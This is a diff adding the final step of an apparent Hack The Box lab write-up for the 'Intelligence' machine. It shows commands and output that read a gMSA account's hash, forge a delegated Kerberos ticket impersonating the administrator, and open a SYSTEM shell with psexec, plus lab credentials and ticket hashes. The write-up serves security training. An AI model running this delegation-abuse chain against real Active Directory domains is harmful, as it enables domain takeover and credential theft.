@@ -456,3 +456,65 @@ TED.GRAVES::intelligence:3a4b4b0205562e23:6c5a2543d767342e8c900226a95407b5:01010
 
 
 ## STEP 4
+wow  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_04.png">  
+```sh
+└─$ netexec ldap 10.129.171.160 -u ted.graves -p Mr.Teddy --gmsa
+LDAP        10.129.171.160  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
+LDAPS       10.129.171.160  636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
+LDAPS       10.129.171.160  636    DC               [*] Getting GMSA Passwords
+LDAPS       10.129.171.160  636    DC               Account: svc_int$             NTLM: 5389896c2609ab8717b9d8f360f760ae     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
+```
+```sh
+└─$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -ts -dc-ip 10.129.171.160 -hashes ':5389896c2609ab8717b9d8f360f760ae' 'intelligence.htb/svc_int$'    
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-11-25 18:24:59] [*] Getting TGT for user
+[2025-11-25 18:25:02] [*] Impersonating administrator
+[2025-11-25 18:25:02] [*] Requesting S4U2self
+[2025-11-25 18:25:03] [*] Requesting S4U2Proxy
+[2025-11-25 18:25:05] [*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+```
+```sh
+└─$ export KRB5CCNAME=administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+
+└─$ impacket-psexec -k -target-ip 10.129.171.160 'dc.intelligence.htb' 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.171.160.....
+[*] Found writable share ADMIN$
+[*] Uploading file dkONiIjk.exe
+[*] Opening SVCManager on 10.129.171.160.....
+[*] Creating service GuSs on 10.129.171.160.....
+[*] Starting service GuSs.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> type c:\users\administrator\desktop\root.txt
+b6e0354c00236a39e5b2f5cc5a462a75
+```
+```sh
+└─$ impacket-describeTicket administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : a787b932d268339b925652a7454e17c0
+[*] User Name                     : administrator
+[*] User Realm                    : intelligence.htb
+[*] Service Name                  : WWW/dc.intelligence.htb
+[*] Service Realm                 : INTELLIGENCE.HTB
+[*] Start Time                    : 25/11/2025 18:25:04 PM
+[*] End Time                      : 26/11/2025 04:25:01 AM
+[*] RenewTill                     : 26/11/2025 18:25:00 PM
+[*] Flags                         : (0x40a50000) forwardable, renewable, pre_authent, ok_as_delegate, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : p4e5MtJoM5uSVlKnRU4XwA==
+[*] Kerberoast hash               : $krb5tgs$18$USER$INTELLIGENCE.HTB$*WWW/dc.intelligence.htb*$09057378883e0377397af3b4$699d5b7ca0035a4b12f7595cfc25fda82b57eb160461fd29f3db42ea33cb9dd566037284eb8a73326b9ce5162b9f3ad299bf0b0d719972b09ba811bbb771b42f09121d18da4e627736fac2bb0ce6f3614e8e3a522c4473f0b5d3d16987d288b00a9092779ecd3f647395c4b8b4fab39f6ccdff0828b58c593249d93e200f683e8a9f4f92dd5000356bac8631bd14dd25190ac975838bbe068f4d9844eba1e982fbcfa43b2a3633c6032f31dfcd7a378dd379bd8ca31782b2771410001608c23af7b83131d31e4a03897596da3614bac6e1e13115f135533528540f78c2dd58f8d0677d97282268793198fbde62f3e1555c18d630792dd08249afa2b3ef61db3974a4bce73bc0a75ebd25a1f3cc06a507a87726ba4f5ce48f75965b63c1103d65bc39bc54a80d9a292c37358c9a87ff0182e493d225c655dae121997936891d8cbe64d3d702a2ae418b06afcf6226e34a1b492c7ab49ce9d3717ca0f199c69e40208f4ddf6be86667d6e9fa3bbb70c54d8fb6231bfb5ee4d8c7f8bfd744f52703c6fba9ef8ff0fa67f02825163d50b1c91fa83cda0dd4bdf5ab5c32c0a708e0057d775280f6905171178c76deec54527965e9d406beae82fb20b9d8f5e152d15f3f1071b855dee1843a4c1a1ee9ae24f11f6dd3a29fa137ebbdc957fb821c596201702c7f31983f4bff400dc4c85f1e9b97d2c8eaae2208b1e7250c2a0203c25165acbcf21efe01c0f21233739b7c11f8313c566991814c82fc9521ac253f78d4fef35877b9d4a9555c3a4d6dfbfd8807055cb6c739250e4219751a25ef2e333652a2751c6321f77794a29c330cba095f88f79c45070d895e7ef339252717ca2f70a73498dd57f41277f84bc8cc108324daa1c1c92a04fc9af05860f9d308863b4ed7821fc8b7c8723156b14cb783d701f830b9f709242cfe2b080394edeb9eea26b9ace0a649d03136e0295d349b5cdb2ccdc6a1ea7e74fd8aee13495dd8e5d482326a8fdc31290b145269369e2f0024464ea1d98814319bca278ee733a021bf83fbafda99db4d939ccaa781c026e989e412f5fe164a254ce0fabf1ce79a97e261c8f7888eed245e654a4e24d5338401fe9aabf6d5f3ea6b244d984e3c162791f6fa5b39d9864d308a9b33599113c6b100e665644613236da2c8b2cbb580f7800dde159af9fc52ec47acd0d04b476d351c0e5468f29e913aa132a9510471510bb19eed8498d1bce0987168ef6500a17c4ae7a61bd91c15588f92772533c4d5b68fc0a7dc1ed23398116ac3939a25f2f245f0e392eb01791637bd5b757e032ca49c06c45f603b7a4d3af5b192a0094cd8c1e97d2bb707f120bb40587c36bb10c6c3266acdc8ab14a664be4723cf882d2ed34d88192f739f3f4a0e1167f24b4f820e130bfcf895b1d43947a3fb594be3cfdf0f64f0a881530242b8f39a0a1ecafd2f9e2d769a17c5ebfdb65f389ec99f633232f13e69598b7678008f4325d849857365ede2fb2a0376f071cc9fc4b08b36ae9e7e8af21d0c360272ca08f313d2136aedc1e6a6fc29f24e5c416e7fefdbba7cfc6e6d7b5568a25c6cf69f705d3be54c2e6d1007be4254e1d95ef2ea502bf8492bbe25210432b3644e25ee740e4789194230ca4d2185d34d862d09e062d9116df6f84bc535a814bd7a45b6d9673c9a5b5bc76bfa5a15310206d2262cd3e870ddde52570b77c4d758140105e8958eaa8b5da1d6c03e8de0b507819fcd8df7159db8133e1e81dd4aee3e84d372efe700c2ed53dddb395f1ad75239d91621c549b7c6401b3954
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : WWW/dc.intelligence.htb
+[*]   Service Realm               : INTELLIGENCE.HTB
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+```
